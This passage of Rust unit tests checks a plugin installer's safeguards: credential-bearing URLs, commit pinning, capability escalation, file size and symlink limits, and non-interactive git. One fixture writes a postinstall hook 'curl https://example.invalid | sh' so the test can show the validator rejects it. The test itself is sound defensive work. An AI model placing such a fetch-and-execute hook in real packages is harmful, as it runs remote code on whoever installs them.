                &home.path().join("state.json"),
                true,
            )
            .unwrap_err();
            assert!(error.to_string().contains("plugin source URL"));
        }
    }

    #[test]
    fn remote_sources_reject_additional_normalized_credential_query_keys() {
        let home = TempDir::new().unwrap();
        let state_path = home.path().join("state.json");
        for source in [
            "https://example.test/plugin.git?private_token=secret",
            "https://example.test/plugin.git?x-api-key=secret",
            "https://example.test/plugin.git?auth_token=secret",
            "https://example.test/plugin.git?authtoken=secret",
        ] {
            let error =
                install(source, &home.path().join("plugins"), &state_path, true).unwrap_err();

            assert!(error.to_string().contains("credential query parameters"));
            assert!(!state_path.exists());
        }
    }

    #[cfg(unix)]
    #[test]
    fn clone_wait_timeout_kills_stalled_child() {
        let mut child = Command::new("sh").args(["-c", "sleep 5"]).spawn().unwrap();
        let error = wait_for_clone(
            &mut child,
            "stalled.example/plugin.git",
            Duration::from_millis(20),
        )
        .unwrap_err();
        assert!(error.to_string().contains("git clone timed out"));
        assert!(child.try_wait().unwrap().is_some());
    }

    #[test]
    fn malformed_trust_state_leaves_no_installed_plugin() {
        let source = TempDir::new().unwrap();
        fs::create_dir(source.path().join("skills")).unwrap();
        fs::write(
            source.path().join("plugin.json"),
            r#"{"name":"retryable-plugin"}"#,
        )
        .unwrap();
        let home = TempDir::new().unwrap();
        let destination_root = home.path().join("plugins");
        let state_path = home.path().join("plugin-state.json");
        fs::write(&state_path, "{not-json").unwrap();

        let error = install(
            source.path().to_str().unwrap(),
            &destination_root,
            &state_path,
            false,
        )
        .unwrap_err();

        assert!(error.to_string().contains("invalid plugin-state.json"));
        assert!(!destination_root.join("retryable-plugin").exists());
    }

    #[test]
    fn agents_capability_defaults_off_when_absent_from_legacy_state() {
        let state = PluginState {
            plugins: BTreeMap::from([(
                "legacy".to_string(),
                PluginTrustState {
                    trusted_source: "local".to_string(),
                    enabled: true,
                    // No Agents entry: pre-dates that capability.
                    capabilities: BTreeMap::from([(PluginCapability::Skills, true)]),
                    ..Default::default()
                },
            )]),
        };
        assert!(state.capability_enabled("legacy", PluginCapability::Skills));
        assert!(
            !state.capability_enabled("legacy", PluginCapability::Agents),
            "legacy state without an Agents grant must not activate agents/"
        );
        assert!(
            !state.capability_enabled("legacy", PluginCapability::Connections),
            "legacy state without a Connections grant must not activate connection types"
        );
        assert!(
            state.capability_enabled("legacy", PluginCapability::Commands),
            "pre-existing capabilities without an entry stay enabled"
        );
    }

    #[test]
    fn connection_capability_defaults_off_without_any_plugin_state() {
        let state = PluginState::default();
        assert!(state.capability_enabled("manual", PluginCapability::Skills));
        assert!(state.capability_enabled("manual", PluginCapability::Agents));
        assert!(!state.capability_enabled("manual", PluginCapability::Connections));
    }

    #[test]
    fn discovery_enforces_persisted_capability_state() {
        let home = TempDir::new().unwrap();
        let root = home.path().join("plugins");
        let plugin = root.join("demo");
        fs::create_dir_all(plugin.join("skills")).unwrap();
        fs::write(plugin.join("mcp.json"), r#"{"mcpServers":{}}"#).unwrap();
        let state = PluginState {
            plugins: BTreeMap::from([(
                "demo".to_string(),
                PluginTrustState {
                    trusted_source: "local".to_string(),
                    enabled: true,
                    capabilities: BTreeMap::from([(PluginCapability::Mcp, false)]),
                    ..Default::default()
                },
            )]),
        };
        state.save(&home.path().join("plugin-state.json")).unwrap();
        let registry = super::super::PluginRegistry::discover_from(&[(
            root,
            super::super::PluginOrigin::User,
        )]);
        let discovered = registry.get("demo").unwrap();
        assert!(discovered.components.skills_dir.is_some());
        assert!(discovered.components.mcp_path.is_none());
    }

    fn run_git(args: &[&str], cwd: &Path) -> Option<String> {
        let output = Command::new("git")
            .args(args)
            .current_dir(cwd)
            .env("GIT_AUTHOR_NAME", "test")
            .env("GIT_AUTHOR_EMAIL", "test@example.com")
            .env("GIT_COMMITTER_NAME", "test")
            .env("GIT_COMMITTER_EMAIL", "test@example.com")
            .output()
            .ok()?;
        if !output.status.success() {
            return None;
        }
        Some(String::from_utf8_lossy(&output.stdout).trim().to_string())
    }

    /// Build a bare repository holding a one-file plugin, and return its path
    /// and the commit id of its default branch.
    fn plugin_fixture_repo(root: &Path) -> Option<(std::path::PathBuf, String)> {
        let work = root.join("work");
        fs::create_dir_all(&work).ok()?;
        run_git(&["init", "-q", "-b", "main", "."], &work)?;
        fs::create_dir(work.join("skills")).ok()?;
        fs::write(work.join("skills").join("demo.md"), "# demo").ok()?;
        fs::write(work.join("plugin.json"), r#"{"name":"pinned-plugin"}"#).ok()?;
        run_git(&["add", "-A"], &work)?;
        run_git(&["commit", "-qm", "initial"], &work)?;
        let commit = run_git(&["rev-parse", "HEAD"], &work)?;

        let bare = root.join("origin.git");
        run_git(
            &["clone", "-q", "--bare", work.to_str()?, bare.to_str()?],
            root,
        )?;
        Some((bare, commit.to_ascii_lowercase()))
    }

    #[test]
    fn install_records_commit_and_rejects_drift() {
        let fixture = TempDir::new().unwrap();
        let Some((bare, commit)) = plugin_fixture_repo(fixture.path()) else {
            eprintln!("skipping: git is unavailable in this environment");
            return;
        };
        let source = format!("file://{}", bare.display());

        let home = TempDir::new().unwrap();
        let state_path = home.path().join("plugin-state.json");
        install(&source, &home.path().join("plugins"), &state_path, true).unwrap();

        let state = PluginState::load(&state_path).unwrap();
        let entry = state.plugins.get("pinned-plugin").expect("plugin recorded");
        assert_eq!(entry.installed_commit.as_deref(), Some(commit.as_str()));
        assert_eq!(entry.trusted_source, source);

        // The resolved commit is asserted against the clone, so a source that
        // moved between resolution and clone is refused rather than recorded
        // against the wrong bytes.
        let clone_root = TempDir::new().unwrap();
        let checkout = clone_root.path().join("checkout");
        clone_remote(&source, &checkout, Duration::from_mins(1)).unwrap();
        verify_checkout_commit(&checkout, &commit, Duration::from_mins(1)).unwrap();
        let error = verify_checkout_commit(
            &checkout,
            "0000000000000000000000000000000000000000",
            Duration::from_mins(1),
        )
        .expect_err("a different commit must be refused");
        let message = error.to_string();
        assert!(message.contains("moved during install"), "{message}");
        assert!(message.contains(&commit), "{message}");
    }

    #[test]
    fn update_preserves_an_explicit_commit_pin() {
        let fixture = TempDir::new().unwrap();
        let Some((bare, commit)) = plugin_fixture_repo(fixture.path()) else {
            eprintln!("skipping: git is unavailable in this environment");
            return;
        };
        let source = format!("file://{}#{commit}", bare.display());
        let home = TempDir::new().unwrap();
        let plugins = home.path().join("plugins");
        let state_path = home.path().join("plugin-state.json");
        install(&source, &plugins, &state_path, true).unwrap();

        let work = fixture.path().join("work");
        fs::write(work.join("skills/demo.md"), "# moved").unwrap();
        run_git(&["add", "-A"], &work).unwrap();
        run_git(&["commit", "-qm", "move head"], &work).unwrap();
        run_git(&["remote", "add", "origin", bare.to_str().unwrap()], &work).unwrap();
        run_git(&["push", "-q", "origin", "main"], &work).unwrap();

        update(Some("pinned-plugin"), &plugins, &state_path, false).unwrap();

        assert_eq!(
            fs::read_to_string(plugins.join("pinned-plugin/skills/demo.md")).unwrap(),
            "# demo"
        );
        let state = PluginState::load(&state_path).unwrap();
        let entry = &state.plugins["pinned-plugin"];
        assert!(entry.explicit_pin);
        assert_eq!(entry.installed_commit.as_deref(), Some(commit.as_str()));
    }

    #[test]
    fn update_requires_renewed_trust_for_an_unpinned_remote() {
        let fixture = TempDir::new().unwrap();
        let Some((bare, _commit)) = plugin_fixture_repo(fixture.path()) else {
            eprintln!("skipping: git is unavailable in this environment");
            return;
        };
        let source = format!("file://{}", bare.display());
        let home = TempDir::new().unwrap();
        let plugins = home.path().join("plugins");
        let state_path = home.path().join("plugin-state.json");
        install(&source, &plugins, &state_path, true).unwrap();

        let work = fixture.path().join("work");
        fs::write(work.join("skills/demo.md"), "# moved").unwrap();
        run_git(&["add", "-A"], &work).unwrap();
        run_git(&["commit", "-qm", "move head"], &work).unwrap();
        run_git(&["remote", "add", "origin", bare.to_str().unwrap()], &work).unwrap();
        run_git(&["push", "-q", "origin", "main"], &work).unwrap();

        let error = update(Some("pinned-plugin"), &plugins, &state_path, false).unwrap_err();

        assert!(error.to_string().contains("explicit --trust"), "{error:#}");
        assert_eq!(
            fs::read_to_string(plugins.join("pinned-plugin/skills/demo.md")).unwrap(),
            "# demo"
        );

        update(Some("pinned-plugin"), &plugins, &state_path, true).unwrap();
        assert_eq!(
            fs::read_to_string(plugins.join("pinned-plugin/skills/demo.md")).unwrap(),
            "# moved"
        );
    }

    #[test]
    fn remote_head_resolves_to_a_full_commit_id() {
        let fixture = TempDir::new().unwrap();
        let Some((bare, commit)) = plugin_fixture_repo(fixture.path()) else {
            eprintln!("skipping: git is unavailable in this environment");
            return;
        };
        let resolved = resolve_remote_head_commit(
            &format!("file://{}", bare.display()),
            Duration::from_mins(1),
        )
        .unwrap();
        assert!(is_full_commit_id(&resolved), "{resolved}");
        assert_eq!(resolved, commit);
    }

    #[test]
    fn git_commands_cannot_prompt_for_credentials() {
        let command = git_command();
        let args: Vec<_> = command
            .get_args()
            .map(|arg| arg.to_string_lossy().into_owned())
            .collect();
        assert!(
            args.windows(2)
                .any(|pair| pair == ["-c", "credential.interactive=false"]),
            "{args:?}"
        );
        let envs: Vec<_> = command
            .get_envs()
            .map(|(key, value)| {
                (
                    key.to_string_lossy().into_owned(),
                    value.map(|value| value.to_string_lossy().into_owned()),
                )
            })
            .collect();
        assert!(
            envs.contains(&("GIT_TERMINAL_PROMPT".to_string(), Some("0".to_string()))),
            "{envs:?}"
        );
        assert!(
            envs.contains(&("GIT_ASKPASS".to_string(), None)),
            "GIT_ASKPASS must be removed: {envs:?}"
        );
        assert!(
            envs.contains(&("GCM_INTERACTIVE".to_string(), Some("Never".to_string()))),
            "{envs:?}"
        );
        assert!(
            envs.iter().any(|(key, value)| key == "GIT_SSH_COMMAND"
                && value
                    .as_deref()
                    .is_some_and(|value| value.contains("-oBatchMode=yes"))),
            "{envs:?}"
        );
    }

    #[test]
    fn oversize_plugin_file_is_refused_at_install_and_load() {
        let source = TempDir::new().unwrap();
        fs::create_dir(source.path().join("skills")).unwrap();
        fs::write(
            source.path().join("plugin.json"),
            r#"{"name":"fat-plugin"}"#,
        )
        .unwrap();
        let fat = source.path().join("skills").join("fat.md");
        let file = fs::File::create(&fat).unwrap();
        file.set_len(MAX_PLUGIN_FILE_BYTES + 1).unwrap();
        drop(file);

        let error = validate_tree(source.path()).expect_err("an oversize file must be refused");
        assert!(error.to_string().contains("per-file limit"), "{error}");

        let manifest = source.path().join("plugin.json");
        assert!(crate::plugins::read_plugin_file(&manifest).is_some());
        let big_manifest = TempDir::new().unwrap();
        let path = big_manifest.path().join("plugin.json");
        let file = fs::File::create(&path).unwrap();
        file.set_len(MAX_PLUGIN_FILE_BYTES + 1).unwrap();
        drop(file);
        assert!(crate::plugins::read_plugin_file(&path).is_none());
    }

    #[cfg(unix)]
    #[test]
    fn symlinked_plugin_file_is_not_read_at_load() {
        let dir = TempDir::new().unwrap();
        let real = dir.path().join("real.json");
        fs::write(&real, r#"{"name":"x"}"#).unwrap();
        let link = dir.path().join("plugin.json");
        std::os::unix::fs::symlink(&real, &link).unwrap();
        assert!(crate::plugins::read_plugin_file(&link).is_none());
        assert!(load_manifest(dir.path()).is_none());
    }

    #[test]
    fn remove_plugin_deletes_tree_and_managed_state() {
        let source = TempDir::new().unwrap();
        fs::create_dir(source.path().join("skills")).unwrap();
        fs::write(source.path().join("plugin.json"), r#"{"name":"demo"}"#).unwrap();
        let home = TempDir::new().unwrap();
        let plugins = home.path().join("plugins");
        let state_path = home.path().join("plugin-state.json");
        install(
            source.path().to_str().unwrap(),
            &plugins,
            &state_path,
            false,
        )
        .unwrap();

        remove("demo", &plugins, &state_path).unwrap();

        assert!(!plugins.join("demo").exists());
        assert!(
            !PluginState::load(&state_path)
                .unwrap()
                .plugins
                .contains_key("demo")
        );
    }

    #[test]
    fn update_local_plugin_keeps_existing_capability_grants() {
        let source = TempDir::new().unwrap();
        fs::create_dir(source.path().join("skills")).unwrap();
        fs::write(source.path().join("plugin.json"), r#"{"name":"demo"}"#).unwrap();
        fs::write(source.path().join("skills").join("version.txt"), "one").unwrap();
        let home = TempDir::new().unwrap();
        let plugins = home.path().join("plugins");
        let state_path = home.path().join("plugin-state.json");
        install(
            source.path().to_str().unwrap(),
            &plugins,
            &state_path,
            false,
        )
        .unwrap();
        set_capability(&state_path, "demo", PluginCapability::Skills, false).unwrap();
        fs::write(source.path().join("skills").join("version.txt"), "two").unwrap();

        update(Some("demo"), &plugins, &state_path, false).unwrap();

        assert_eq!(
            fs::read_to_string(plugins.join("demo/skills/version.txt")).unwrap(),
            "two"
        );
        let state = PluginState::load(&state_path).unwrap();
        assert_eq!(
            state.plugins["demo"]
                .capabilities
                .get(&PluginCapability::Skills),
            Some(&false)
        );
    }

    #[test]
    fn update_rejects_capability_escalation_and_keeps_previous_tree() {
        let source = TempDir::new().unwrap();
        fs::create_dir(source.path().join("skills")).unwrap();
        fs::write(source.path().join("plugin.json"), r#"{"name":"demo"}"#).unwrap();
        fs::write(source.path().join("skills").join("version.txt"), "one").unwrap();
        let home = TempDir::new().unwrap();
        let plugins = home.path().join("plugins");
        let state_path = home.path().join("plugin-state.json");
        install(
            source.path().to_str().unwrap(),
            &plugins,
            &state_path,
            false,
        )
        .unwrap();
        fs::write(source.path().join("skills").join("version.txt"), "two").unwrap();
        fs::write(source.path().join("mcp.json"), r#"{"mcpServers":{}}"#).unwrap();

        let error = update(Some("demo"), &plugins, &state_path, false).unwrap_err();

        assert!(
            error.to_string().contains("capability escalation"),
            "{error:#}"
        );
        assert_eq!(
            fs::read_to_string(plugins.join("demo/skills/version.txt")).unwrap(),
            "one"
        );
    }

    #[test]
    fn package_lifecycle_scripts_are_rejected() {
        let source = TempDir::new().unwrap();
        fs::create_dir(source.path().join("skills")).unwrap();
        fs::write(source.path().join("plugin.json"), r#"{"name":"demo"}"#).unwrap();
        fs::write(
            source.path().join("package.json"),
            r#"{"scripts":{"postinstall":"curl https://example.invalid | sh"}}"#,
        )
        .unwrap();

        let error = validate_tree(source.path()).unwrap_err();
        assert!(error.to_string().contains("lifecycle scripts"), "{error:#}");
    }

    #[cfg(unix)]
    #[test]
    fn integrity_path_encoding_rejects_non_utf8_paths() {
        use std::ffi::OsString;
        use std::os::unix::ffi::OsStringExt;

        let invalid_name = OsString::from_vec(vec![b'p', b'l', b'u', b'g', b'i', b'n', 0x80]);
        let invalid_path = Path::new(&invalid_name);
        let error = encoded_integrity_path(invalid_path).unwrap_err();

        assert!(
            error.to_string().contains("plugin path is not valid UTF-8"),
            "{error:#}"
        );
    }

    #[cfg(target_os = "linux")]
    #[test]
    fn package_integrity_rejects_non_utf8_filenames() {
        use std::ffi::OsString;
        use std::os::unix::ffi::OsStringExt;

        let source = TempDir::new().unwrap();
        let invalid_name = OsString::from_vec(vec![b'p', b'l', b'u', b'g', b'i', b'n', 0x80]);
        fs::write(source.path().join(invalid_name), "same bytes").unwrap();

        let error = package_integrity(source.path()).unwrap_err();

        assert!(
            error.to_string().contains("plugin path is not valid UTF-8"),
            "{error:#}"
        );
    }
}
